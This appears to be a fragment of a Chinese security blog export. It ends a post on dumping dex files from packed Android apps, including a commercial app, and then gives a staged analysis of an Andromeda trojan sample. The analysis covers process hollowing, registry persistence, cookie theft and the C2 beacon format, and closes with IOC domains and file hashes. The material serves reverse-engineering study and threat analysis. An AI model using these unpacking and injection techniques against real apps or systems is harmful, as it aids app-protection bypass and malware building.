<img src="/2023/09/14/ART%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/02ac72275c1c4dfc9aac6193ee5023de.png" class="" title="f1ca3dd4a77c3fe5691952d151ad1257.png">

<center>刷机完成</center>

<h3 id="测试脱壳效果"><a href="#测试脱壳效果" class="headerlink" title="测试脱壳效果"></a>测试脱壳效果</h3><p><strong>PS：测试之前可以先去把<em>sdcard</em>目录下安装系统时候产生的dex文件删除掉，有点多。</strong></p>
<p>先测试一下我们原来自己写的LoadDex，安装apk把dex放在<code>sdcard</code>路径下</p>
<p><code>adb install .\loadDex.apk</code></p>
<p><code>adb push 4.dex /sdcard/</code></p>
<img src="/2023/09/14/ART%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/image-20230914155434953.png" class="" title="image-20230914155434953">

<ul>
<li><p>安装完成后在手机系统设置里给apk打开文件访问权限，才能脱壳写文件</p>
</li>
<li><p>设置完之后运行app，然后再*/sdcard/*目录下找到dump下来的dex文件</p>
</li>
</ul>
<img src="/2023/09/14/ART%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/c2844eb50c5b4fc08553de56a58df482.png" class="" title="0781b10e10116d2149a2310aef57d5a9.png">

<p>然后，新建一个目录将这些文件都pull下来</p>
<ul>
<li><p>先把<em>sdcard</em>目录下的所有dex都放在一个文件夹里，然后把整个文件夹pull下来</p>
<p><code>mkdir /sdcard/dex</code></p>
<p><code>cp *.dex /sdcard/dex</code></p>
</li>
</ul>
<p>在电脑上准备好的目录下执行</p>
<p><code>adb pull /sdcard/dex</code></p>
<img src="/2023/09/14/ART%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/29e34c1fa4c84ace9e38e0b43754b4a5.png" class="" title="73573295a1ed54ff9e75733069de0ef1.png">

<p>同时我们可以在<em>sdcard</em>目录下的<em>dex</em>文件中搜索TestActivity</p>
<p><code>grep -ril "TestActivity" ./*.dex</code></p>
<img src="/2023/09/14/ART%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/1d1f3c5174b047bab0a248a1d950d9ea.png" class="" title="4fc1f38f66130ed89540bf68ecfe9cdc.png">

<p>然后用GDA打开这些文件查看一下</p>
<img src="/2023/09/14/ART%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/688afadad884485c87adf0c50cddba50.png" class="" title="3f19bacb4dd0713db2916d61ac1f1980.png">

<ul>
<li>完全正常</li>
</ul>
<p>因为这个apk和dex是我们自己写的使用<em>DexClassLoader</em>加载的，所以肯定是可以dump下来的。我们再拿其它的apk试试。</p>
<p>换了两个app，Express100和货拉拉司机版</p>
<img src="/2023/09/14/ART%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/image-20230914155735045.png" class="" title="image-20230914155735045">
<img src="/2023/09/14/ART%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/8afea948022543abac1fdd8374ad207e.png" class="" title="6914aacc706ad63fcd7b7472a7407dad.png">

<center>Express100</center>

<ul>
<li>Express100这个dex脱壳正常所有的函数代码都能正常显示，下面试试货拉拉的。</li>
</ul>
<img src="/2023/09/14/ART%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/image-20230914155936844.png" class="" title="image-20230914155936844">

<center>货拉拉司机版</center>

<img src="/2023/09/14/ART%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/a2a9c8573cd34b38bf921c16a88118f6.png" class="" title="0d4a5553d8d1f553254cdbf2a7d1a38b.png">

<ul>
<li>货拉拉dump下来的dex打开之后发现函数体都是空的，因为这个壳做了函数抽取的保护方案。这次我们使用的整体脱壳的方案不能应对函数抽取壳的脱壳，下一篇我们处理第二代壳函数抽取壳的问题。</li>
</ul>
<p><strong>小结一下：</strong></p>
<p>前面我们对InMemoryDexClassLOader和Dex2Oat被禁用掉这两个流程进行了脱壳点的总结，找到了它们的脱壳点（虽然大部分壳为了安全都不会这么做，因为执行to oat的时候dex文件时没有加密的），接下来我们再分析一下如果它执行了Dex2Oat怎么脱壳。</p>
<h3 id="进行Dex2Oat流程的脱壳分析"><a href="#进行Dex2Oat流程的脱壳分析" class="headerlink" title="进行Dex2Oat流程的脱壳分析"></a>进行Dex2Oat流程的脱壳分析</h3><p>在前面我们分析到了执行ExecAndReturnCode()的时候，执行到了execve()这个函数的时候就会去调用Dex2Oat()这种方式来加载dex文件</p>
<img src="/2023/09/14/ART%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/b2662afa121249cf88b24d45bf494288.png" class="" title="5194421095811fa941723658bce2ce9e.png">

<ul>
<li>如果这里正常执行过execve()之后，我们就进入到了Dex2Oat的流程当中了</li>
</ul>
<img src="/2023/09/14/ART%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/e7ca73439a1744b7bb096661dc57e77a.png" class="" title="85ff5583eed7b76fe215941ef27d2bfb.png">

<ul>
<li>这个文件可以看到是一个带有main()的可执行程序，进入main()函数先执行了Dex2Oat()。我们跟进去看看</li>
</ul>
<img src="/2023/09/14/ART%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/9098a19e7e524694a6568d75c17c6ff3.png" class="" title="4636e02cf9534c96cd7fce1b6a1cf6b7.png">

<ul>
<li>这个函数的前面是对传进来的命令行参数的解析、初始化ART内存映射、检查要编译的dex文件是否可以打开等操作，我们主要跟进dex2oat-&gt;Setup()看一下编译前的设置。</li>
</ul>
<img src="/2023/09/14/ART%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/acaf40b185c045fcaeee04c603e2333a.png" class="" title="64d13612569bd45a89941c76b846f8d7.png">

<ul>
<li><p>在Setup()的结尾处呢，会对当前所有的dex文件进行一个遍历确保存活然后注册，我们就可以在这个地方进行dex的脱壳<br>包括还有一些其它的地方也会有对dex内存地址的引用</p>
<img src="/2023/09/14/ART%E4%B8%8B%E4%B8%80%E4%BB%A3%E5%A3%B3%E9%80%9A%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/4e3a19252a3547d19e10ae363f225748.png" class="" title="5b0a1858f7e5c741e488d00e183d1e89.png">
</li>
<li><p>我们需要的时候都可以在这些地方添加脱壳代码进行脱壳。在流程中有很多这种脱壳点，不一个一个找出来了。</p>
</li>
</ul>
]]></content>
      <categories>
        <category>Android逆向</category>
      </categories>
      <tags>
        <tag>Android脱壳</tag>
        <tag>学习笔记</tag>
        <tag>Android源码分析</tag>
        <tag>ART脱壳</tag>
      </tags>
  </entry>
  <entry>
    <title>Andromeda木马分析</title>
    <url>/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="样本简介"><a href="#样本简介" class="headerlink" title="样本简介"></a>样本简介</h1><table>
<thead>
<tr>
<th align="left">MD5</th>
<th>文件类型</th>
</tr>
</thead>
<tbody><tr>
<td align="left">44ff2421bbd7918c6ad68da4fa276e02</td>
<td>exe</td>
</tr>
</tbody></table>
<span id="more"></span>

<h1 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h1><img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210621173535459.png" class="" title="image-20210621173535459">

<h1 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h1><h2 id="行为分析"><a href="#行为分析" class="headerlink" title="行为分析"></a>行为分析</h2><p>行为监控：释放了大量可执行文件并执行</p>
<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210613163748901.png" class="" title="image-20210613163748901">

<p>执行监控：</p>
<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210712225228859.png" class="" title="image-20210712225228859">

<p>进程监控：可以看到有大量个跨进程间操作；大致可以看到执行分了几个阶段：MD5.exe&gt;hwwefuxasa.exe&gt;MD5.exe&gt;msiexec.exe&gt;reyefiyevu.exe&gt;msiexec.exe&gt;wuauclt.exe</p>
<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210613170050764.png" class="" title="image-20210613170050764">

<p>文件创建监控：</p>
<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210613172155974.png" class="" title="image-20210613172155974">

<p>文件删除监控：</p>
<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210613174023213.png" class="" title="image-20210613174023213">

<h2 id="第一阶段：MD5-exe"><a href="#第一阶段：MD5-exe" class="headerlink" title="第一阶段：MD5.exe"></a>第一阶段：MD5.exe</h2><p>释放了一些dll和exe文件在之后的下一阶段使用</p>
<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210614211545714.png" class="" title="image-20210614211545714">

<p>创建temp文件夹路径并设置文件夹属性</p>
<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210614203558637.png" class="" title="image-20210614203558637">

<p>在temp文件夹下创建文件</p>
<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210614204018971.png" class="" title="image-20210614204018971">

<p>往文件内写入内容</p>
<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210614204358356.png" class="" title="image-20210614204358356">

<p>设置文件时间</p>
<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210614205438515.png" class="" title="image-20210614205438515">

<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210614205635004.png" class="" title="image-20210614205635004">

<p>创建了一个exe文件&amp;几个dll文件+ric文件</p>
<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210614212511913.png" class="" title="image-20210614212511913">

<p>启动heswfuxasa.exe</p>
<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210614213229679.png" class="" title="image-20210614213229679">

<p>设置注册表启动heswfuxasa.exe启动附加调试器</p>
<h2 id="第二阶段：heswfuxasa-exe"><a href="#第二阶段：heswfuxasa-exe" class="headerlink" title="第二阶段：heswfuxasa.exe"></a>第二阶段：heswfuxasa.exe</h2><p>通过GetProcAddress来获取所需的函数</p>
<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210615215928628.png" class="" title="image-20210615215928628">

<p>LoadLibrary来加载所需的模块</p>
<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210615220210230.png" class="" title="image-20210615220210230">

<p>以挂起的方式创建进程</p>
<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210615220933949.png" class="" title="image-20210615220933949">

<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210615221701331.png" class="" title="image-20210615221701331">

<p>卸载挂起进程内存空间数据</p>
<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210615223426537.png" class="" title="image-20210615223426537">

<p>以读写执行的权限在目标进程创建开辟内存空间</p>
<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210615224548100.png" class="" title="image-20210615224548100">

<p>在内存中写入数据</p>
<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210615225320320.png" class="" title="image-20210615225320320">

<p>在执行到GetThreadContext的时候通过pContext参数指向的CONTEXT结构找到新的线程入口点</p>
<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210621174956056.png" class="" title="image-20210621174956056">

<p>然后在调用ResumeThread之前通过process Hacker修改一下线程入口点方便附加调试(这里可以使用<code>CC</code>或者<code>EB FE</code>来修改入口点)</p>
<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210617003253716.png" class="" title="image-20210617003253716">

<h2 id="第三阶段：MD5-exe"><a href="#第三阶段：MD5-exe" class="headerlink" title="第三阶段：MD5.exe"></a>第三阶段：MD5.exe</h2><p>用x32Dbg附加调试，再将此处的内存修改为之前的内容（因为前面为了方便调试修改了两个字节为<code>EB FE</code>）</p>
<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210617144509637.png" class="" title="image-20210617144509637">

<p>为当前进程加载新的资源模块</p>
<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210617165346529.png" class="" title="image-20210617165346529">

<p>使用加密服务</p>
<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210617172343847.png" class="" title="image-20210617172343847">

<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210617172751662.png" class="" title="image-20210617172751662">

<p>拼接路径删除之前释放的文件</p>
<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210617182706462.png" class="" title="image-20210617182706462">

<p>装载新的资源模块</p>
<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210617184302238.png" class="" title="image-20210617184302238">

<p>继续以挂起的方式创建进程，创建自身的新进程并修改进程内存空间</p>
<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210617213637015.png" class="" title="image-20210617213637015">

<p>仍然在挂起处暂停，修改线程入口点为无限循环，方便附加调试(将<code>E8 90</code>改为<code>EB FE</code>)</p>
<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210625144911095.png" class="" title="image-20210625144911095">

<h2 id="第四阶段：MD5-exe"><a href="#第四阶段：MD5-exe" class="headerlink" title="第四阶段：MD5.exe"></a>第四阶段：MD5.exe</h2><p>获取系统快照信息来遍历进程：查找是否有卡巴的杀软avp.exe</p>
<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210618003204591.png" class="" title="image-20210618003204591">

<p>释放文件msiexec.exe</p>
<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210618100027438.png" class="" title="image-20210618100027438">

<p>将MD5.exe的内容拷贝到0F48F.tmp中，重新开辟一块内存空间并将数据读入开辟的内存</p>
<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210618151108108.png" class="" title="image-20210618151108108">

<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210618151951237.png" class="" title="image-20210618151951237">

<p>删除0FFBF.tmp文件</p>
<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210618160131848.png" class="" title="image-20210618160131848">

<ul>
<li>使用ShellExecuteExW的方式启动msiexec.exe(可以设置注册表调试器附加启动)</li>
</ul>
<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210618161911590.png" class="" title="image-20210618161911590">

<h2 id="第五阶段：msiexec-exe"><a href="#第五阶段：msiexec-exe" class="headerlink" title="第五阶段：msiexec.exe"></a>第五阶段：msiexec.exe</h2><p>获取当前用户使用的桌面语言：0x804表示简体中文</p>
<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210618180041834.png" class="" title="image-20210618180041834">

<p>在<code>%temp%</code>目录下创建新的wehexukaje.Gav文件并写入内容</p>
<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210618222132923.png" class="" title="image-20210618222132923">

<p>并修改文件时间</p>
<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210618222101458.png" class="" title="image-20210618222101458">

<p>重新创建befunvatur.dll、Ziniyucenaqe.dll、xizitixeqob.dll、salebolotew.dll、reyefiyevu.exe、nst5FFB.tmp、</p>
<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210618222023450.png" class="" title="image-20210618222023450">

<p>启动新进程reyefiyevu.exe</p>
<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210618230409713.png" class="" title="image-20210618230409713">

<h2 id="第六阶段：reyefiyevu-exe"><a href="#第六阶段：reyefiyevu-exe" class="headerlink" title="第六阶段：reyefiyevu.exe"></a>第六阶段：reyefiyevu.exe</h2><p>通过IDA可以看到当前程序主要执行了，获取当前线程的句柄并修改优先级并加载xifuzinahi.dll的操作</p>
<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210619004513010.png" class="" title="image-20210619004513010">

<p>加载xifuzinahi.dll之后做了一些开辟内存开辟，拷贝，获取模块以及字符串等操作</p>
<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210619005700963.png" class="" title="image-20210619005700963">

<p>加载Ziniyucenaqe.dll获取用户默认的语言环境</p>
<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210619173810398.png" class="" title="image-20210619173810398">

<p>加载Befunuvatur.dll后查看导=导入函数可以看到有一些进程和内存相关的操作，来动态调试一下</p>
<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210619174325026.png" class="" title="image-20210619174325026">

<p>以挂起的方式创建进程msiexec.exe</p>
<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210619201624743.png" class="" title="image-20210619201624743">

<p>以修改线程OEP处内存为无限循环的方式附加进程msiexec.exe</p>
<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210619210354720.png" class="" title="image-20210619210354720">

<h2 id="第七阶段：msiexec-exe"><a href="#第七阶段：msiexec-exe" class="headerlink" title="第七阶段：msiexec.exe"></a>第七阶段：msiexec.exe</h2><p>加载新的资源</p>
<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210619220231614.png" class="" title="image-20210619220231614">

<p>获取释放的文件名并删除</p>
<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210619224453665.png" class="" title="image-20210619224453665">

<p>继续创建傀儡进程启动msiexec.exe</p>
<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210619230600359.png" class="" title="image-20210619230600359">

<p>修改线程OEP为无限循环<code>EB FE</code></p>
<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210619231722619.png" class="" title="image-20210619231722619">

<h2 id="第八阶段：msiexec-exe"><a href="#第八阶段：msiexec-exe" class="headerlink" title="第八阶段：msiexec.exe"></a>第八阶段：msiexec.exe</h2><p>创建一个互斥体来防止多开</p>
<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210619234819467.png" class="" title="image-20210619234819467">

<p>遍历当前进程</p>
<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210620112130335.png" class="" title="image-20210620112130335">

<p>检测注册表<code>HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Disk\Enum</code>下的键值</p>
<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210620110024956.png" class="" title="image-20210620110024956">

<p>进入新写入的内存执行后续代码</p>
<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210620154742685.png" class="" title="image-20210620154742685">

<p>将现有<code>%temp%</code>路径下的msiexec.exe拷贝到”C:\ProgramData\svchost.exe”</p>
<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210620003955673.png" class="" title="image-20210620003955673">

<p>将”C:\ProgramData\svchost.exe”写入注册表自启动</p>
<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210620004503674.png" class="" title="image-20210620004503674">

<p>使用文件映射（NtCreateSection<code>+</code>NtMapViewOfSection）的方式来执行远程进程注入</p>
<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210620162327198.png" class="" title="image-20210620162327198">

<p>以挂起的方式创建wuauclt.exe</p>
<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210620163009867.png" class="" title="image-20210620163009867">

<p>修改线程OEP为无限循环（<code>EB FE</code>）</p>
<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210625144750506.png" class="" title="image-20210625144750506">

<h2 id="第九个阶段：wuauclt-exe"><a href="#第九个阶段：wuauclt-exe" class="headerlink" title="第九个阶段：wuauclt.exe"></a>第九个阶段：wuauclt.exe</h2><p>通过调用GetEnvironmentVariableW从环境变量获取启动程序的完整路径</p>
<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210706210151786.png" class="" title="image-20210706210151786">

<p>再用SetEnvironmentVariableW传入空字符串来重置该变量</p>
<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210706210941966.png" class="" title="image-20210706210941966">

<p>用获取到的系统卷信息创建一个互斥体防止进程多开</p>
<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210630233459555.png" class="" title="image-20210630233459555">

<p>创建一个新文件文件名和后缀米随机并将自身复制进去，写入注册表自启动之后再将msiexec.exe删除</p>
<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210706215336940.png" class="" title="image-20210706215336940">

<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210706215626718.png" class="" title="image-20210706215626718">

<p><strong>然后初始化网络创建新的线程</strong></p>
<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210706220343714.png" class="" title="image-20210706220343714">

<p>获取系统的版本号</p>
<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210705214914849.png" class="" title="image-20210705214914849">

<p>查看注册表判断是否启用远程PRC限制</p>
<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210705215604773.png" class="" title="image-20210705215604773">

<p>获取本地的IP</p>
<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210705221012684.png" class="" title="image-20210705221012684">

<p>获取浏览器的cookie</p>
<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210707120259771.png" class="" title="image-20210707120259771">

<p>通过对发送消息的格式和前面的一些行为来判断可能是属于仙女座（Andromeda ）的样本</p>
<pre><code>id:%lu|bid:%lu|bv:%lu|sv:%lu|pa:%lu|la:%lu|ar:%lu
id 值根据本地系统卷信息产生
bid 值是硬编码的，可能指编译id.
bv值也是硬编码的，可能指编译版本（目前是206h(518))
sv值代表受害机器的系统版本
pa值是调用ZwQueryInformationProcess API的返回值，用以确定OS是32位还是64位。
la值是根据www.update.microsoft.com的IP地址而生成的
ar值是调用CheckTokenMembership API的返回值，确认bot是否运行在管理员权限下。
</code></pre>
<p>加密前的字符串</p>
<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210701211959385.png" class="" title="image-20210701211959385">

<p>第一次加密：自定义加密</p>
<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210707102207882.png" class="" title="image-20210707102207882">

<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210706155750770.png" class="" title="image-20210706155750770">

<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210706155621097.png" class="" title="image-20210706155621097">

<p>二次加密：再经过base64加密</p>
<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210707103351430.png" class="" title="image-20210707103351430">

<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210706155829786.png" class="" title="image-20210706155829786">

<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210706155702049.png" class="" title="image-20210706155702049">

<p>将数据发送往服务器并接收服务器返回的消息</p>
<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210706161529651.png" class="" title="image-20210706161529651">

<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210704000806080.png" class="" title="image-20210704000806080">

<p>这是从网上找到的仙女座C&amp;C服务器的Web面板的图片</p>
<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210706160912985.png" class="" title="image-20210706160912985">

<p>如果服务器可以正常连接服务器下发数据包，病毒程序根据接收到的包解密后得到的ID执行不同的操作</p>
<img src="/2022/11/14/Andromeda%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20210705154023635.png" class="" title="image-20210705154023635">

<p>因为仙女座已经被摧毁后续的命令下发执行操作无法继续分析，通过前面的分析可以看到这是一个模块化的病毒样本，分阶段释放了大量的exe和dll文件最终注入了系统进程wuauclt.exe，并在多线程和内存中释放的多模块之间跳转执行并将上传和下载的信息都进行了加密处理一定程度上加大了分析的难度，具有较高的稳定性和隐蔽性。模块的功能有浏览器cookie抓取，本机信息获取等行为。</p>
<h2 id="IOC"><a href="#IOC" class="headerlink" title="IOC"></a>IOC</h2><p>xdqzpbcgrvkj.ru<br>orzdwjtvmein.in<br>anam0rph.su<br>ygiudewsqhct.in<br>bdcrqgonzmwuehky.nl<br>somicrososoft.ru<br>pe.suckmycocklameavindustry.in<br>sc.suckmycocklameavindustry.in</p>
<h2 id="释放的文件"><a href="#释放的文件" class="headerlink" title="释放的文件"></a>释放的文件</h2><table>
<thead>
<tr>
<th>文件名</th>
<th>MD5</th>
</tr>
</thead>
<tbody><tr>
<td>Befunuvatur.dll</td>
<td>5E1BD554B134DAF7753021CA7AE9C362</td>
</tr>
<tr>
<td>Fewuxusahif.dll</td>
<td>1e1120080170a963da2dc9461789f1c1</td>
</tr>
<tr>
<td>hewefuxasa.exe</td>
<td>9537cf2d215b97bc3effadd74e1a75c9</td>
</tr>
<tr>
<td>Hunoqoriqop.dll</td>
<td>ae057dff4e992c5208234b3d62b05f40</td>
</tr>
<tr>
<td>reyefiyevu.exe</td>
<td>c86fc56810ae163cbd8a728c4d501948</td>
</tr>
<tr>
<td>salebolotew.dll</td>
<td>d75174a7147f7a1c3fa59dcb60be70ad</td>
</tr>
<tr>
<td>vinoliwulab.dll</td>
<td>e255130efe8242a6e2573ba63a667f2d</td>
</tr>
<tr>
<td>wehexukaje.Gav</td>
<td>85d804cd262bfc55dcd09bbec078c1e9</td>
</tr>
<tr>
<td>xizitixeqob.dll</td>
<td>08d784e44da8fcf358b2c932ee318293</td>
</tr>
<tr>
